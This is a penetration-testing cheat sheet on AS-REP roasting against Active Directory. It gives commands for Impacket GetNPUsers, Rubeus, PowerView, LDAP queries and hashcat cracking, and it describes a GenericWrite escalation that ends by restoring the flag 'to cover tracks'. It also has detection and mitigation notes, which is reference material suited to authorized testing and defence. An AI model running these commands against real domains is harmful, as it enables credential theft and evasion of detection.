# ASREP Roasting

Attack accounts with Kerberos pre-authentication disabled to obtain encrypted AS-REP tickets for offline cracking.
Useful when you have a list of valid usernames but no credentials yet, or to identify weak passwords on vulnerable accounts.

## Quick Reference

```bash
# Find and extract AS-REP hashes
GetNPUsers.py ad.someorg.local/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users

# Crack the hash
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
```

## Impacket GetNPUsers

### Enumerate and Extract AS-REP Hashes

```bash
# With username list (no authentication required)
GetNPUsers.py ad.someorg.local/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users

# Alternative method
GetNPUsers.py ad.someorg.local/ -dc-ip 172.16.5.5 -usersfile valid_ad_users
```

## PowerView Enumeration

### Find Users with Pre-Auth Disabled

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

## Rubeus

### Extract AS-REP Hash for Specific User

```powershell
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

## LDAP Search

### Find Vulnerable Users via LDAP

```bash
# Find users with DONT_REQUIRE_PREAUTH flag (0x400000 / 4194304)
ldapsearch -x -LLL -H ldap://dc.domain.local -D 'user@domain.local' -W \
  -b "dc=domain,dc=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName userPrincipalName
```

## Hash Cracking

### Hashcat - Crack AS-REP Hash

```bash
# Mode 18200 for Kerberos 5 AS-REP etype 23
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Common Workflows

### Anonymous ASREP Roasting

1. Enumerate valid usernames (Kerbrute, LDAP, RPC)
2. Create username list file
3. Run GetNPUsers.py with -no-pass and -usersfile
4. Extract any returned AS-REP hashes
5. Crack hashes offline with Hashcat

### Authenticated ASREP Enumeration

1. Use valid domain credentials
2. Query LDAP or use PowerView to find DONT_REQUIRE_PREAUTH accounts
3. Target specific users with Rubeus or GetNPUsers.py
4. Crack extracted hashes

### Privilege Escalation via GenericWrite

1. Identify accounts where you have GenericWrite/GenericAll permissions
2. Enable DONT_REQUIRE_PREAUTH attribute on target account
3. Extract AS-REP hash
4. Crack hash offline
5. Disable DONT_REQUIRE_PREAUTH attribute to cover tracks

## Notes

### Attack Overview

ASREP Roasting is similar to Kerberoasting but targets the AS-REP (Authentication Service Response) instead of TGS-REP. Key differences:

- **No SPN required**: Any user account can be targeted
- **No authentication needed**: Can be performed with just a username list
- **Pre-authentication disabled**: Targets accounts with DONT_REQUIRE_PREAUTH flag set

### How Kerberos Pre-Authentication Works

**With pre-authentication enabled (normal)**:
1. User enters password
2. Password encrypts a timestamp
3. Domain Controller decrypts timestamp to validate password
4. If successful, TGT is issued

**With pre-authentication disabled (vulnerable)**:
1. Attacker requests authentication data for account
2. Domain Controller returns encrypted AS-REP
3. AS-REP can be cracked offline without any authentication

### Success Factors

- Attack success depends on the account having a weak password
- Vendor installation guides sometimes specify disabling pre-authentication for service accounts
- If you have GenericWrite or GenericAll permissions, you can enable this attribute, extract the hash, and disable it again

### Detection and Mitigation

**Detection**:
- Monitor for accounts with DONT_REQUIRE_PREAUTH flag set
- Alert on unusual AS-REQ traffic patterns
- Track changes to userAccountControl attribute

**Mitigation**:
- Enforce strong password policies on all accounts
- Regularly audit accounts with pre-authentication disabled
- Remove DONT_REQUIRE_PREAUTH flag unless absolutely necessary
- Use long, complex passwords for accounts that require this setting
- Monitor for unauthorized changes to userAccountControl attributes

### UserAccountControl Flag

The DONT_REQUIRE_PREAUTH flag is part of the userAccountControl attribute:
- Decimal value: 4194304
- Hex value: 0x400000
- LDAP filter: `userAccountControl:1.2.840.113556.1.4.803:=4194304`
